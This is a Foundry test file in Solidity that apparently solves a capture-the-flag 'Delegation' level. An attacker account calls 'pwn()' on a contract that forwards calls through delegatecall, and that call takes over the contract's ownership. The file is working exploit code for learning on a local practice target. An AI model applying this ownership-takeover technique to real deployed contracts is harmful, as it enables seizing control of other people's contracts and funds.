// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {Utilities} from "./utilities/Utilities.sol";
import {Delegate} from "../src/Delegation.sol";
import {Delegation} from "../src/Delegation.sol";

contract DelegationTest is Test {
    Utilities internal utils;
    Delegate internal delegate;
    Delegation internal delegation;

    address internal owner;
    address internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        attacker = users[1];
        vm.label(attacker, "Attacker");

        vm.startPrank(owner);

        delegate = new Delegate(owner);
        vm.label(address(delegate), "Delegate");

        delegation = new Delegation(address(delegate));
        vm.label(address(delegation), "Delegation");

        assertEq(delegation.owner(), owner);

        vm.stopPrank();
    }

    function testExploit() public {
        vm.startPrank(attacker);

        (bool success, ) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        require(success, "failed");

        assertEq(delegation.owner(), attacker);

        vm.stopPrank();
    }
}
